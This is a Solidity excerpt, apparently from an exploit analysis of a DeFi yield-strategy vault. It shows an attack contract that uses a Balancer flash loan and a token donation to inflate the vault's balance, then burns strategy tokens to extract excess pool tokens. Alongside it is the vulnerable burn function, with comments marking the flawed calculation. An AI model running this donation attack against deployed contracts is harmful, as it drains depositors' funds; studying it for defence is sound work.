contract Attack {
    function Attack() public {
        //...
        Balancer.flashLoan(address(this), tokens, amounts, userData);
        //...
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata fees,
        bytes calldata userData
    ) external {
        // attack preparation
        USDC.transfer(address(YieldStrategy_1), 308_000 * 1e6);
        YieldStrategy_1.mintDivested(address(this)); // mint pool token with USDC

        uint256 transferAmount = YieldStrategy_1.balanceOf(address(this)) / 2;
        YieldStrategy_1.transfer(address(YieldStrategy_2), transferAmount);
        YieldStrategy_2.mint(address(YieldStrategy_2)); // mint strategy token

        // attack execution
        YieldStrategy_1.transfer(address(YieldStrategy_2), YieldStrategy_1.balanceOf(address(this))); // donate pool token to strategy token vault
        YieldStrategy_2.burn(address(this)); // burn strategy token to get pool token

        // recover to USDC
        YieldStrategy_2.mint(address(YieldStrategy_2)); // recover donated pool token
        YieldStrategy_2.burn(address(this));

        YieldStrategy_1.transfer(address(YieldStrategy_1), YieldStrategy_1.balanceOf(address(this)));
        YieldStrategy_1.burnDivested(address(this)); // burn pool token to USDC
        
        // pay the flash loan
        USDC.transfer(address(Balancer), amounts[0]);
    }
}

contract Strategy {
    function burn(address to)
        external
        isState(State.INVESTED)
        returns (uint256 poolTokensObtained)
    {
        // Caching
        IPool pool_ = pool;
        uint256 poolCached_ = poolCached;
        uint256 totalSupply_ = _totalSupply;

        // Burn strategy tokens
        uint256 burnt = _balanceOf[address(this)];
        _burn(address(this), burnt);

        // balance surged by call ❹
        poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
        // many pool tokens obtained by the attacker by call ❺
        pool_.safeTransfer(address(to), poolTokensObtained);

        // Update pool cache
        poolCached = poolCached_ - poolTokensObtained;
    }
}